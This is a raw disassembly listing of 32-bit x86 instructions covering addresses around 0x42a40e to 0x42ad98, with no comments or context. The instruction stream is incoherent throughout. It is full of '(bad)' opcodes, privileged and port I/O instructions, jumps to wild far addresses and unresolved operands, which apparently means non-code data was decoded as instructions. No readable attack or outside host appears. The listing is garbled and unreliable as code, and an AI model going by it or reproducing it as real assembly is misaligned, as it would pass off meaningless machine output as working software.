  42a40e:	cmp    ebx,edx
  42a410:	in     eax,dx
  42a411:	lods   eax,DWORD PTR ds:[esi]
  42a412:	cmp    eax,0xcd72c3a4
  42a417:	stos   BYTE PTR es:[edi],al
  42a418:	cmp    eax,0xf009352
  42a41d:	pop    ebx
  42a41e:	push   cs
  42a41f:	pop    ss
  42a420:	pop    ecx
  42a421:	out    0x4a,eax
  42a423:	cdq    
  42a424:	xchg   ecx,eax
  42a425:	jmp    0x114ce204
  42a42a:	iret   
  42a42b:	cwde   
  42a42c:	mov    eax,ds:0x1af3152b
  42a431:	pop    esi
  42a432:	jp     0x42a41b
  42a434:	out    dx,eax
  42a435:	push   ecx
  42a436:	adc    eax,0xe25a2666
  42a43b:	loopne 0x42a415
  42a43d:	hlt    
  42a43e:	jl     0x42a3cc
  42a440:	(bad)  
  42a441:	sub    edx,ecx
  42a443:	out    0xc3,al
  42a445:	pushf  
  42a446:	pop    edx
  42a447:	xor    DWORD PTR [edx],ebp
  42a449:	dec    ecx
  42a44a:	lock je 0x42a414
  42a44d:	les    ebp,FWORD PTR [edx+eax*1]
  42a450:	fadd   st(2),st
  42a452:	mov    edi,0x54efcd65
  42a457:	pop    ebx
  42a458:	sbb    ecx,esi
  42a45a:	in     al,0x4a
  42a45c:	cld    
  42a45d:	mov    eax,ebx
  42a45f:	jp     0x42a497
  42a461:	xchg   edi,eax
  42a462:	rcr    DWORD PTR [ebp+0x27],0xd9
  42a466:	fwait
  42a467:	in     al,0xc1
  42a469:	popf   
  42a46a:	ss add al,0x64
  42a46d:	ret    0x1c4e
  42a470:	mov    BYTE PTR [esi+0x17],0x2b
  42a474:	sub    al,0x50
  42a476:	mov    BYTE PTR [edi+0x37],dh
  42a479:	and    dh,BYTE PTR [ecx]
  42a47b:	popa   
  42a47c:	ret    
  42a47d:	leave  
  42a47e:	leave  
  42a47f:	mov    ebp,DWORD PTR [esi-0x4]
  42a482:	and    edx,DWORD PTR [edx+ecx*1]
  42a485:	mov    eax,DWORD PTR [ebx]
  42a487:	lahf   
  42a488:	lods   eax,DWORD PTR ds:[esi]
  42a489:	sar    dh,0xc4
  42a48c:	retf   
  42a48d:	aaa    
  42a48e:	cwde   
  42a48f:	in     eax,0xab
  42a491:	mov    bl,0xa5
  42a493:	add    DWORD PTR [ebp-0x3545e6ff],ebp
  42a499:	loopne 0x42a505
  42a49b:	mov    dl,0x6f
  42a49d:	add    DWORD PTR [ebx],esi
  42a49f:	push   ebp
  42a4a0:	mov    al,ds:0xbaa18e0b
  42a4a5:	pop    ebp
  42a4a6:	mov    al,ds:0x625a8786
  42a4ab:	add    eax,0x2963cfe7
  42a4b0:	mov    eax,ds:0xfb98ed2
  42a4b5:	fldl2t 
  42a4b7:	adc    BYTE PTR [esi],al
  42a4b9:	ficom  WORD PTR [ecx]
  42a4bb:	ret    0x9844
  42a4be:	mov    cl,dl
  42a4c0:	dec    ecx
  42a4c1:	push   ebp
  42a4c2:	lock push ecx
  42a4c4:	adc    ebx,ebp
  42a4c6:	cwde   
  42a4c7:	adc    DWORD PTR [ecx+0x71],esp
  42a4ca:	aaa    
  42a4cb:	dec    esi
  42a4cc:	mov    dl,0xd9
  42a4ce:	mov    ebp,DWORD PTR [edi+0x7a]
  42a4d1:	inc    ebx
  42a4d2:	(bad)  
  42a4d3:	enter  0x4039,0xb8
  42a4d7:	sub    dh,BYTE PTR [edi-0x7eda1ae]
  42a4dd:	in     al,0xb2
  42a4df:	retf   0x4900
  42a4e2:	lds    ecx,FWORD PTR [edx]
  42a4e4:	popa   
  42a4e5:	pusha  
  42a4e6:	jns    0x42a4f1
  42a4e8:	aam    0x1a
  42a4ea:	sbb    esi,DWORD PTR [edi+0xdb25c6c]
  42a4f0:	jo     0x42a4ea
  42a4f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a4f3:	in     al,dx
  42a4f4:	in     eax,dx
  42a4f5:	out    0x4c,eax
  42a4f7:	dec    esp
  42a4f8:	repnz pop ds
  42a4fa:	fnsave [eax-0x58]
  42a4fd:	jmp    0x26:0x637fc644
  42a504:	push   cs
  42a505:	out    dx,eax
  42a506:	add    ebp,eax
  42a508:	dec    ebp
  42a509:	cs (bad) 
  42a50b:	gs out dx,al
  42a50d:	(bad)  
  42a50e:	xor    al,0xb8
	...
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0xd9c3ef9f
  42a583:	dec    esi
  42a584:	cwde   
  42a585:	les    eax,FWORD PTR [ecx]
  42a587:	add    BYTE PTR [ecx+eax*1],al
  42a58a:	add    BYTE PTR [eax],al
  42a58c:	int3   
  42a58d:	ret    
  42a58e:	sbb    BYTE PTR [esi-0x2ccda9a],cl
  42a594:	push   edx
  42a595:	fdivr  DWORD PTR [ebp-0x33]
  42a598:	dec    esp
  42a599:	dec    edx
  42a59a:	nop
  42a59b:	std    
  42a59c:	inc    eax
  42a59d:	add    BYTE PTR [edi+ecx*2],cl
  42a5a0:	dec    edi
  42a5a1:	jo     0x42a5c9
  42a5a3:	ins    BYTE PTR es:[edi],dx
  42a5a4:	dec    esi
  42a5a5:	stc    
  42a5a6:	loope  0x42a5e5
  42a5a8:	mov    ch,0xf1
  42a5aa:	scas   eax,DWORD PTR es:[edi]
  42a5ab:	xor    eax,DWORD PTR [eax+0x18ff967d]
  42a5b1:	lods   eax,DWORD PTR ds:[esi]
  42a5b2:	jae    0x42a5f8
  42a5b4:	sub    al,0xcf
  42a5b6:	scas   eax,DWORD PTR es:[edi]
  42a5b7:	mov    ah,0x49
  42a5b9:	fs push 0xeca4925c
  42a5bf:	das    
  42a5c0:	popa   
  42a5c1:	stos   BYTE PTR es:[edi],al
  42a5c2:	mov    edi,0xb1ae09b5
  42a5c7:	adc    BYTE PTR [edi+0x5c],0x3
  42a5cb:	(bad)  
  42a5cc:	nop
  42a5cd:	mov    ebp,0x6a9b3068
  42a5d2:	dec    ecx
  42a5d3:	test   DWORD PTR [eax],edi
  42a5d5:	in     al,dx
  42a5d6:	push   ebx
  42a5d7:	arpl   WORD PTR [eax-0x7a2749c1],bp
  42a5dd:	ds sub ah,bh
  42a5e0:	xchg   ebx,eax
  42a5e1:	out    0xd3,eax
  42a5e3:	rol    esi,cl
  42a5e5:	dec    esi
  42a5e6:	pcmpeqb mm7,mm7
  42a5e9:	popa   
  42a5ea:	data16 test BYTE PTR [ecx+0x20],cl
  42a5ee:	(bad)  
  42a5f0:	cmp    esi,DWORD PTR [ebp-0xf6f140e]
  42a5f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a5f7:	arpl   WORD PTR ds:0x53edfed3,ax
  42a5fd:	add    DWORD PTR [ebx],esi
  42a5ff:	ret    
  42a600:	loopne 0x42a618
  42a602:	idiv   BYTE PTR [edx]
  42a604:	cmp    eax,0x39683e64
  42a609:	ja     0x42a613
  42a60b:	or     eax,0xb26ffdfa
  42a610:	mov    edi,0x995356bf
  42a615:	push   ebx
  42a616:	mov    ecx,DWORD PTR [ebx+0x314de26f]
  42a61c:	jb     0x42a664
  42a61e:	push   0x53e388d8
  42a623:	mov    BYTE PTR [ebx],al
  42a625:	sub    ebp,0xffffffb8
  42a628:	inc    edx
  42a629:	scas   al,BYTE PTR es:[edi]
  42a62a:	test   esp,ebp
  42a62c:	and    al,0x5f
  42a62e:	stos   BYTE PTR es:[edi],al
  42a62f:	aaa    
  42a630:	and    ah,BYTE PTR [ebx]
  42a632:	cmp    BYTE PTR [eax],ah
  42a634:	test   bl,ch
  42a636:	out    0x43,al
  42a638:	mov    ds:0x98ae3462,al
  42a63d:	mov    ch,0x68
  42a63f:	imul   ecx,DWORD PTR [esi+0x2ef309c3],0x76
  42a646:	sub    esp,esp
  42a648:	dec    esi
  42a649:	lahf   
  42a64a:	cwde   
  42a64b:	mov    eax,0x2c70aba3
  42a650:	adc    eax,0x6a94a7ab
  42a655:	mov    bl,0xe3
  42a657:	cmp    BYTE PTR [edx+0x3e9fbb73],0xd8
  42a65e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a65f:	aaa    
  42a660:	jno    0x42a673
  42a662:	addr16 nop
  42a664:	mov    edi,0x1a5a18f4
  42a669:	aaa    
  42a66a:	mov    edx,0xc1ea9266
  42a66f:	cmp    eax,DWORD PTR [eax]
  42a671:	mov    WORD PTR [edx],gs
  42a673:	xchg   edx,eax
  42a674:	hlt    
  42a675:	add    bh,al
  42a677:	dec    ebx
  42a678:	mov    cl,0xfe
  42a67a:	test   al,0xe0
  42a67c:	and    DWORD PTR [esp+ebp*2-0x778bad97],ecx
  42a683:	xchg   ebx,eax
  42a684:	sub    DWORD PTR [esi+0x2b],ebp
  42a687:	xor    cl,BYTE PTR [ebx+0x52b8bf8b]
  42a68d:	mov    ds:0xd502,eax
	...
  42a6f2:	add    BYTE PTR [eax],al
  42a6f4:	and    al,0x16
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi+0x6cb8131c],0x9c1deaaa
  42a705:	lds    eax,FWORD PTR [ecx]
  42a707:	add    BYTE PTR [ecx+eax*1],al
  42a70a:	add    BYTE PTR [eax],al
  42a70c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a70d:	push   ds
  42a70e:	xor    DWORD PTR [edi+0x774d1bcf],esp
  42a714:	pop    esp
  42a715:	xchg   edx,eax
  42a716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a717:	popf   
  42a718:	sbb    dl,BYTE PTR [eax]
  42a71a:	sub    ecx,DWORD PTR [edi-0x8]
  42a71d:	bound  esi,QWORD PTR [esi+0x142cacd1]
  42a723:	xchg   esp,eax
  42a724:	lods   al,BYTE PTR ds:[esi]
  42a725:	push   edx
  42a726:	cli    
  42a727:	xor    BYTE PTR [esi],0x16
  42a72a:	scas   eax,DWORD PTR es:[edi]
  42a72b:	jmp    0x42a799
  42a72d:	jmp    0xc1265bbd
  42a732:	add    dl,BYTE PTR [eax-0x2e]
  42a735:	sbb    al,0xd2
  42a737:	jb     0x42a741
  42a739:	xchg   esp,eax
  42a73a:	xchg   BYTE PTR [ebx+0xb],ah
  42a73d:	sbb    DWORD PTR [edi+ebp*2-0x3f69b835],esi
  42a744:	xor    edx,DWORD PTR [ebx]
  42a746:	xchg   esp,eax
  42a747:	pop    ebx
  42a748:	pop    ebp
  42a749:	push   edi
  42a74a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a74b:	xor    DWORD PTR [esi],edi
  42a74d:	xchg   esp,eax
  42a74e:	jnp    0x42a738
  42a750:	mov    ecx,0x954871fd
  42a755:	pop    es
  42a756:	enter  0x896d,0xac
  42a75a:	mov    eax,?
  42a75c:	sbb    ah,BYTE PTR ds:0x30935c7d
  42a762:	xor    eax,ecx
  42a764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a765:	xchg   ebx,eax
  42a766:	outs   dx,BYTE PTR ds:[esi]
  42a767:	retf   
  42a768:	jmp    0x42a704
  42a76a:	pop    ebp
  42a76b:	mov    ebp,0x13130eb6
  42a770:	dec    esi
  42a771:	arpl   WORD PTR [ebp+0x55],sp
  42a774:	mul    dl
  42a776:	and    al,0xd0
  42a778:	inc    esi
  42a779:	sub    eax,0x9d9041e2
  42a77e:	lahf   
  42a77f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a780:	push   es
  42a781:	aam    0x81
  42a783:	ss retf 
  42a785:	mov    sp,WORD PTR [esi]
  42a788:	jp     0x42a79b
  42a78a:	adc    dl,BYTE PTR es:[ebx]
  42a78d:	mov    esi,0x3d08c4be
  42a792:	cld    
  42a793:	sbb    DWORD PTR [eax+0x16],ebx
  42a796:	and    DWORD PTR [esi+0x7e],ebx
  42a799:	cwde   
  42a79a:	(bad)  
  42a79b:	aad    0xda
  42a79d:	pop    eax
  42a79e:	mov    bh,0x4
  42a7a0:	push   ebp
  42a7a1:	mov    ch,0x40
  42a7a3:	(bad)
  42a7a6:	add    dx,WORD PTR [esi-0x76]
  42a7aa:	jo     0x42a792
  42a7ac:	xchg   ebx,eax
  42a7ad:	test   DWORD PTR [ecx],edx
  42a7af:	enter  0xa4f8,0xef
  42a7b3:	loope  0x42a7c6
  42a7b5:	popa   
  42a7b6:	push   ds
  42a7b7:	imul   esp,DWORD PTR [ebx+ecx*2+0x66],0xb7753915
  42a7bf:	jle    0x42a7ed
  42a7c1:	or     BYTE PTR [ecx],dh
  42a7c3:	inc    edx
  42a7c4:	add    DWORD PTR [esi+0x37bfdb82],edx
  42a7ca:	aam    0x91
  42a7cc:	aas    
  42a7cd:	push   0x25
  42a7cf:	pusha  
  42a7d0:	call   0x5067898f
  42a7d5:	stos   BYTE PTR es:[edi],al
  42a7d6:	out    dx,eax
  42a7d7:	icebp  
  42a7d8:	cs scas al,BYTE PTR es:[edi]
  42a7da:	and    DWORD PTR [ecx+0x2ad55bd1],esi
  42a7e0:	pusha  
  42a7e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a7e2:	mov    ch,0xf6
  42a7e4:	xor    ch,BYTE PTR [ebx-0x5c7fafda]
  42a7ea:	adc    dl,ah
  42a7ec:	sub    al,0x8c
  42a7ee:	adc    al,0x1a
  42a7f0:	in     al,0x37
  42a7f2:	call   0xaa705d97
  42a7f7:	jne    0x42a7b4
  42a7f9:	rcr    DWORD PTR [edi+0x4bb641df],0x1f
  42a800:	pop    ebp
  42a801:	or     ah,BYTE PTR [ebx-0xf34b38a]
  42a807:	loop   0x42a7e6
  42a809:	adc    ecx,DWORD PTR [esi-0x366bb8c3]
  42a80f:	push   cs
	...
  42a874:	mov    ah,BYTE PTR [ebp+0x63]
  42a877:	mov    edi,0x75debfef
  42a87c:	add    ebp,0x32c86c97
  42a882:	cli    
  42a883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a884:	mov    al,ds:0x40001c6
  42a889:	add    DWORD PTR [eax],eax
  42a88b:	add    BYTE PTR [esi-0x590d08af],ah
  42a891:	push   0xfffffff5
  42a893:	adc    al,0xa5
  42a895:	js     0x42a8ed
  42a897:	ja     0x42a90b
  42a899:	jne    0x42a8cf
  42a89b:	int3   
  42a89c:	popa   
  42a89d:	xor    eax,0x2cc5226f
  42a8a2:	out    dx,eax
  42a8a3:	dec    ebx
  42a8a4:	jmp    0x471d:0xb8d33326
  42a8ab:	jbe    0x42a8c3
  42a8ad:	shl    BYTE PTR [esi+0x70a32c3c],0xf7
  42a8b4:	fnstsw WORD PTR [ebx]
  42a8b6:	mov    eax,ds:0x1ada86a8
  42a8bb:	ins    BYTE PTR es:[edi],dx
  42a8bc:	xchg   ebp,eax
  42a8bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a8be:	imul   esp,DWORD PTR [ecx],0xdd6704f
  42a8c4:	mov    WORD PTR [esi+0x55],?
  42a8c7:	pop    ebp
  42a8c8:	fist   WORD PTR [eax-0x14c37d8d]
  42a8ce:	call   0xd06e:0x81a8dfc2
  42a8d5:	pop    eax
  42a8d6:	mov    ebx,0x93466233
  42a8db:	sbb    ah,BYTE PTR [eax]
  42a8dd:	call   0xb0b53954
  42a8e2:	inc    esp
  42a8e3:	fisub  WORD PTR [bp+0x53]
  42a8e8:	mul    DWORD PTR [esi-0x26]
  42a8eb:	fsub   DWORD PTR [ecx]
  42a8ed:	push   edi
  42a8ee:	pop    esp
  42a8ef:	xchg   edx,eax
  42a8f0:	xchg   ebx,eax
  42a8f1:	sbb    ebx,DWORD PTR [edx-0x62]
  42a8f4:	js     0x42a8a2
  42a8f6:	idiv   BYTE PTR [edi-0x8]
  42a8f9:	jg     0x42a8e0
  42a8fb:	(bad)  
  42a8fc:	scas   eax,DWORD PTR es:[edi]
  42a8fd:	xor    al,0xf1
  42a8ff:	test   eax,0xe9e148c6
  42a904:	mov    BYTE PTR [edx+0x48396741],bl
  42a90a:	xor    eax,0xdbabd499
  42a90f:	push   cs
  42a910:	or     ah,BYTE PTR [edx]
  42a912:	cld    
  42a913:	xchg   ebx,eax
  42a914:	je     0x42a8d4
  42a916:	stc    
  42a917:	out    dx,al
  42a918:	or     esp,edx
  42a91a:	xor    al,0x51
  42a91c:	js     0x42a8e7
  42a91e:	jp     0x42a92f
  42a920:	clc    
  42a921:	(bad)  
  42a922:	je     0x42a8df
  42a924:	adc    ebp,esi
  42a926:	shl    dl,cl
  42a928:	sbb    DWORD PTR [edi],ebx
  42a92a:	jg     0xc8df68d4
  42a930:	mov    ah,0xf4
  42a932:	aad    0x4
  42a934:	adc    eax,0x809d2970
  42a939:	inc    edx
  42a93a:	and    eax,0x4e51086b
  42a93f:	addr16 mov ah,0xe
  42a942:	stos   BYTE PTR es:[edi],al
  42a943:	fiadd  WORD PTR [edx+ecx*4-0x7506e77c]
  42a94a:	outs   dx,BYTE PTR ds:[esi]
  42a94b:	pop    ebp
  42a94c:	jae    0x42a8fb
  42a94e:	xchg   BYTE PTR gs:[eax],al
  42a951:	adc    al,0xeb
  42a953:	xlat   BYTE PTR ds:[ebx]
  42a955:	loope  0x42a968
  42a957:	lahf   
  42a958:	mov    ebx,esi
  42a95a:	mov    ecx,0xa9be693b
  42a95f:	(bad)  [edx+0x35]
  42a962:	call   0x61c0:0xe1330539
  42a969:	cmp    ecx,DWORD PTR [edi+0x3e5f8f02]
  42a96f:	aad    0x44
  42a971:	test   ebx,0x251c0a1d
  42a977:	(bad)  
  42a979:	mov    cl,0xd3
  42a97b:	xor    DWORD PTR [edx-0x7],ebp
  42a97e:	cwde   
  42a97f:	pop    ss
  42a980:	jo     0x42a90d
  42a982:	aas    
  42a983:	bound  eax,QWORD PTR [edi+0x5f]
  42a986:	ss xor bl,bl
  42a989:	lods   al,BYTE PTR ds:[esi]
  42a98a:	hlt    
  42a98b:	mov    eax,0xd166b90b
	...
  42a9f4:	test   al,0x93
  42a9f6:	sbb    eax,0xfbee3fee
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	cmp    eax,0xa4136789
  42aa05:	mov    DWORD PTR [ecx],0x10400
  42aa0b:	add    BYTE PTR ds:0xb337b220,cl
  42aa11:	add    al,0x48
  42aa13:	jge    0x42aa82
  42aa15:	jnp    0x42aa11
  42aa17:	cmp    ebp,DWORD PTR [edi+0x7]
  42aa1a:	mov    ds:0x29b0bb9a,al
  42aa1f:	jbe    0x42aa9a
  42aa21:	in     al,0xd0
  42aa23:	pop    ds
  42aa24:	sbb    eax,ebp
  42aa26:	loopne 0x42a9fa
  42aa28:	lea    eax,[esi]
  42aa2a:	xchg   esp,eax
  42aa2b:	lods   eax,DWORD PTR ds:[esi]
  42aa2c:	dec    edx
  42aa2d:	add    al,0x16
  42aa2f:	xchg   edi,eax
  42aa30:	repnz int 0xd6
  42aa33:	(bad)  
  42aa34:	lods   al,BYTE PTR ds:[esi]
  42aa35:	cmp    BYTE PTR [ecx-0x69],bh
  42aa38:	outs   dx,DWORD PTR ds:[esi]
  42aa39:	ror    DWORD PTR [edx+0x49],cl
  42aa3c:	adc    ebp,DWORD PTR [edx]
  42aa3e:	in     al,0x7c
  42aa40:	enter  0x9f38,0xe8
  42aa44:	fisubr DWORD PTR ss:[ebx+eiz*1-0x6ca8e8a3]
  42aa4c:	les    esp,FWORD PTR [ebx+0x12]
  42aa4f:	repnz xor BYTE PTR [ecx-0x6d],bl
  42aa53:	xor    BYTE PTR [edx-0x57ef9b52],bh
  42aa59:	sub    DWORD PTR [esi+esi*2],edi
  42aa5c:	xlat   BYTE PTR ds:[ebx]
  42aa5d:	dec    eax
  42aa5e:	pop    edx
  42aa5f:	dec    esi
  42aa60:	xchg   edi,eax
  42aa61:	xor    eax,0x727bbf56
  42aa66:	adc    edi,DWORD PTR [esi+0x63]
  42aa69:	add    esi,esi
  42aa6b:	xlat   BYTE PTR ds:[ebx]
  42aa6c:	and    eax,0x2fe89011
  42aa71:	adc    eax,DWORD PTR [edx+0x8]
  42aa74:	sub    BYTE PTR [edx],0x43
  42aa77:	cs jmp 0x2d54990f
  42aa7d:	cmp    BYTE PTR [edx-0x482a9a44],dh
  42aa83:	out    0x83,al
  42aa85:	push   0x7c45de05
  42aa8a:	push   ss
  42aa8b:	sub    ch,BYTE PTR [edi-0x2a]
  42aa8e:	and    DWORD PTR [ebp-0x257ff9c7],edi
  42aa94:	inc    ebx
  42aa95:	mov    ecx,0x73e43240
  42aa9a:	inc    BYTE PTR [edi+0x3]
  42aa9d:	sbb    dl,ch
  42aa9f:	rol    BYTE PTR [esi+0x56],cl
  42aaa2:	stc    
  42aaa3:	push   ebp
  42aaa4:	sub    ah,cl
  42aaa6:	arpl   WORD PTR [ecx+ecx*2+0x56e188c4],di
  42aaad:	rcl    BYTE PTR [eax-0x16a913dd],cl
  42aab3:	pop    esi
  42aab4:	sti    
  42aab5:	stc    
  42aab6:	test   BYTE PTR [edx-0x358e3697],dl
  42aabc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aabd:	mov    esi,0x643d2119
  42aac2:	dec    ebp
  42aac3:	test   al,0x3b
  42aac6:	jno    0x42ab26
  42aac8:	cmp    edx,eax
  42aaca:	jp     0x42aac8
  42aacc:	or     al,0x65
  42aace:	in     eax,0xee
  42aad0:	dec    eax
  42aad1:	sbb    al,0xaa
  42aad3:	out    0xb0,eax
  42aad5:	push   ebx
  42aad6:	add    bl,BYTE PTR [edx+0x3b]
  42aad9:	loope  0x42ab36
  42aadb:	pop    ss
  42aadc:	dec    edi
  42aadd:	sbb    al,0x1f
  42aadf:	pop    ecx
  42aae0:	imul   ecx,DWORD PTR [ebx-0x16],0xffffffd5
  42aae4:	in     eax,0x3f
  42aae6:	cwde   
  42aae7:	and    cl,BYTE PTR [ecx-0x79be374e]
  42aaed:	cwde   
  42aaee:	inc    edx
  42aaef:	pop    ebp
  42aaf0:	jmp    0x43da3080
  42aaf5:	bound  edx,QWORD PTR [ebx-0x77]
  42aaf8:	push   eax
  42aaf9:	mov    cl,0xbe
  42aafb:	push   0xffffffd3
  42aafd:	enter  0x3e42,0x84
  42ab01:	popa   
  42ab02:	pop    ebp
  42ab03:	scas   al,BYTE PTR es:[edi]
  42ab04:	xor    al,0x48
  42ab06:	mov    ds:0x39ccf7b,al
  42ab0b:	std    
  42ab0c:	int3   
  42ab0d:	imul   esp,DWORD PTR [eax],0x91
	...
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	outs   dx,BYTE PTR ds:[esi]
  42ab81:	sub    eax,0xc8a822f4
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    al,0x1
  42ab8a:	add    BYTE PTR [eax],al
  42ab8c:	xchg   ebx,eax
  42ab8d:	cs mov esi,0x6f244970
  42ab93:	jbe    0x42abf7
  42ab95:	mov    ah,0x2a
  42ab97:	mov    edi,0xe2e5df56
  42ab9c:	inc    ecx
  42ab9d:	out    dx,eax
  42ab9e:	clts   
  42aba0:	and    eax,0xc9d68053
  42aba5:	mov    al,0x3a
  42aba7:	or     BYTE PTR [ecx+ebp*2+0x36ac06d1],cl
  42abae:	jb     0x42ab71
  42abb0:	add    bl,ch
  42abb2:	enter  0x18f0,0x3f
  42abb6:	inc    eax
  42abb7:	mov    BYTE PTR [eax+ebx*4],al
  42abba:	popf   
  42abbb:	leave  
  42abbc:	jg     0x42abb1
  42abbe:	xchg   edi,eax
  42abbf:	addr16 ret 0x156b
  42abc3:	inc    ebx
  42abc4:	(bad)  
  42abc5:	xor    BYTE PTR [edi],dh
  42abc7:	xchg   DWORD PTR [esi],ebx
  42abc9:	popa   
  42abca:	int    0xc0
  42abcc:	lds    ebp,FWORD PTR [eax-0x45]
  42abcf:	daa    
  42abd0:	jns    0x42ac1b
  42abd2:	lock int 0xb3
  42abd5:	dec    ecx
  42abd6:	xchg   edi,eax
  42abd7:	sub    ecx,esp
  42abd9:	out    dx,eax
  42abda:	xor    ecx,DWORD PTR [ebp-0x5d]
  42abdd:	sub    al,0x9e
  42abdf:	dec    edi
  42abe0:	mov    ebx,0xb10e6c93
  42abe5:	pop    ss
  42abe6:	mov    ?,ebx
  42abe8:	push   edi
  42abe9:	(bad)  
  42abea:	out    dx,eax
  42abeb:	fcom   QWORD PTR [esi-0x52fbf1d4]
  42abf1:	data16 test al,0x48
  42abf4:	cdq    
  42abf5:	add    al,0x13
  42abf7:	pop    ebp
  42abf8:	enter  0x4680,0xd7
  42abfc:	stos   BYTE PTR es:[edi],al
  42abfd:	and    eax,0x80290e8a
  42ac02:	and    al,0xed
  42ac04:	cmp    dl,BYTE PTR [ebp+0x79d6ba8e]
  42ac0a:	mov    esi,0x9f989eab
  42ac0f:	cwde   
  42ac10:	xor    BYTE PTR [ecx+0x7b],bl
  42ac13:	mov    bh,0xf4
  42ac15:	ss int3 
  42ac17:	jbe    0x42ac95
  42ac19:	bound  ecx,QWORD PTR [edx+0x17]
  42ac1c:	lock mov eax,ds:0xf3b14e7
  42ac22:	(bad)
  42ac25:	lahf   
  42ac26:	push   ss
  42ac27:	ins    BYTE PTR es:[edi],dx
  42ac28:	and    esi,ebp
  42ac2a:	adc    esi,DWORD PTR [eax-0x11]
  42ac2d:	xor    ecx,esi
  42ac2f:	add    al,0x4e
  42ac31:	fcmovb st,st(6)
  42ac33:	dec    ebx
  42ac34:	and    DWORD PTR [edi+0x72],0x4db53b0
  42ac3b:	popf   
  42ac3c:	mov    dh,0x9a
  42ac3e:	jbe    0x42ac24
  42ac40:	fidivr DWORD PTR [ecx]
  42ac42:	pop    ecx
  42ac43:	inc    edi
  42ac44:	cwde   
  42ac45:	loope  0x42ac83
  42ac47:	jp     0x42ac07
  42ac49:	rcl    DWORD PTR [eax+0x65],1
  42ac4c:	or     al,0x5e
  42ac4e:	scas   eax,DWORD PTR es:[edi]
  42ac4f:	push   ebx
  42ac50:	ror    BYTE PTR [eax+0x497021d],1
  42ac56:	repz pop esp
  42ac58:	mov    ecx,0xcc3ccebf
  42ac5d:	jmp    0xbb9917bb
  42ac62:	xchg   DWORD PTR [ecx+esi*8-0x139999b6],esp
  42ac69:	pop    edx
  42ac6a:	mov    ?,WORD PTR [edi]
  42ac6c:	repnz mov ecx,0xa6467e28
  42ac72:	enter  0xb8be,0x99
  42ac76:	pop    esi
  42ac77:	push   esp
  42ac78:	les    ebx,FWORD PTR [ebp+0x68]
  42ac7b:	sub    al,0x9d
  42ac7d:	imul   esp,ecx,0xaaf62238
  42ac83:	push   ds
  42ac84:	push   edi
  42ac85:	fcmovnu st,st(3)
  42ac87:	jl     0x42ac94
  42ac89:	(bad)  
  42ac8b:	xchg   ecx,eax
  42ac8c:	(bad)  
  42ac8d:	hlt    
  42ac8e:	fidiv  DWORD PTR [ecx]
	...
  42acf4:	jmp    0xdf7cc92b
  42acf9:	ds out dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	mov    dl,BYTE PTR [ebp-0x62]
  42ad03:	inc    edi
  42ad04:	lods   al,BYTE PTR ds:[esi]
  42ad05:	leave  
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    al,0x1
  42ad0a:	add    BYTE PTR [eax],al
  42ad0c:	adc    edi,DWORD PTR ds:0xbb065972
  42ad12:	sub    eax,0xca3281d6
  42ad17:	not    DWORD PTR [ecx-0x7b2c4850]
  42ad1d:	retf   0x4618
  42ad20:	inc    ebp
  42ad21:	pop    es
  42ad22:	add    DWORD PTR [edi+ecx*4],edi
  42ad25:	pop    esp
  42ad26:	out    0xc0,eax
  42ad28:	fcmove st,st(3)
  42ad2a:	fcmovne st,st(6)
  42ad2c:	aaa    
  42ad2d:	jl     0x42ad7f
  42ad2f:	or     eax,0xd0e2083e
  42ad34:	int3   
  42ad35:	add    al,0x74
  42ad37:	dec    ecx
  42ad38:	loope  0x42ad5b
  42ad3a:	and    BYTE PTR [esp+edx*8],ch
  42ad3d:	mov    ebx,0xbb0052af
  42ad42:	(bad)  
  42ad43:	sbb    DWORD PTR [ebp-0x611b40dd],edx
  42ad49:	fldcw  WORD PTR [esi-0x5]
  42ad4c:	jecxz  0x42ad29
  42ad4e:	xchg   edx,eax
  42ad4f:	and    eax,0x22e22381
  42ad54:	jne    0x42ad15
  42ad56:	jmp    0x42adab
  42ad58:	xchg   DWORD PTR [esi+ebp*1-0x20],esp
  42ad5c:	dec    eax
  42ad5d:	pop    es
  42ad5e:	lahf   
  42ad5f:	sub    ebx,eax
  42ad61:	pop    ecx
  42ad62:	add    dl,BYTE PTR [edx]
  42ad64:	(bad)  
  42ad65:	jo     0x42adcf
  42ad67:	sub    ah,ah
  42ad69:	stc    
  42ad6a:	sbb    bh,cl
  42ad6c:	and    al,0x7
  42ad6e:	fstp   QWORD PTR [esp+esi*2-0x6a71bf54]
  42ad75:	push   ecx
  42ad76:	adc    eax,0x41a73a97
  42ad7b:	inc    ecx
  42ad7c:	mov    ch,0x41
  42ad7e:	jmp    0x1ad38330
  42ad83:	mov    dl,0xf2
  42ad85:	xchg   esi,eax
  42ad86:	sbb    BYTE PTR [esi-0x161a3223],ch
  42ad8c:	pmullw mm7,QWORD PTR [edi+0x1e9ac0e9]
  42ad93:	mov    eax,ds:0x4fa4e12b
  42ad98:	(bad)  
